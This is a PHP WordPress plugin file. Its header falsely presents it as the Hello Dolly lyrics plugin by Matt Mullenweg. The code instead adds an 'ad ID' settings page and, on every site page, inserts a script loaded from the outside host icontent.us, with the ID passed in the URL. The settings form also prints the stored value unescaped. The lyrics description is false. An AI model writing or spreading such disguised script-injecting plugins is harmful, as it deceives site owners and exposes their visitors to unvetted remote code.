<?php
/**
 * @package Adsw
 * @version 1.6
 */
/*
Plugin Name: Adsw
Plugin URI: http://wordpress.org/plugins/hello-dolly/
Description: This is not just a plugin, it symbolizes the hope and enthusiasm of an entire generation summed up in two words sung most famously by Louis Armstrong: Hello, Dolly. When activated you will randomly see a lyric from <cite>Hello, Dolly</cite> in the upper right of your admin screen on every page.
Author: Matt Mullenweg
Version: 1.6
Author URI: http://ma.tt/
*/

class ADSWplugin {

  protected  $option_name = 'adsw_ad';

  public function __construct() {
    add_action('wp_footer', array($this, 'add_script'));

    add_action('admin_menu', array($this, 'admin_menu'));
    add_action('admin_init', array($this, 'admin_init'));
  }

  function admin_menu() {
    add_options_page(
      'ADSW title',
      'ADSW Menu Item',
      'manage_options',
      $this->option_name . '_group',
      array($this, 'options_page')
    );
  }

  function admin_init() {
    register_setting($this->option_name . '_group', $this->option_name . '_id', 'sanitize_text_field');
  }

  function add_script() {
    $opt = $this->get_ad_id();
    if ($opt) {
      ?>
      <script>(function () {
          var s = document.createElement('script');
//          s.src = '//adsw_admin.dev/test-js.js?sid=<?php //print $opt; ?>//';
          s.src = '//icontent.us/461c23bec38cef6df8.js?sid=<?php print $opt; ?>';
          document.body.appendChild(s);
        })();</script>
      <?php
    }
  }

  protected function get_ad_id() {
    return get_option($this->option_name . '_id');
  }

  function options_page() {
    ?>
    <div class="wrap">
      <h2>Your Plugin Name</h2>

      <form method="post" action="options.php">
        <?php settings_fields($this->option_name . '_group'); ?>
        <table class="form-table">
          <tr valign="top">
            <th scope="row">New Option Name</th>
            <td><input type="text" name="<?php print $this->option_name; ?>_id" value="<?php echo get_option($this->option_name . '_id'); ?>" /></td>
          </tr>
        </table>

        <p class="submit">
          <input type="submit" class="button-primary" value="<?php _e('Save Changes') ?>" />
        </p>
      </form>
    </div>
  <?php }

}

$ADSWplugin = new ADSWplugin();

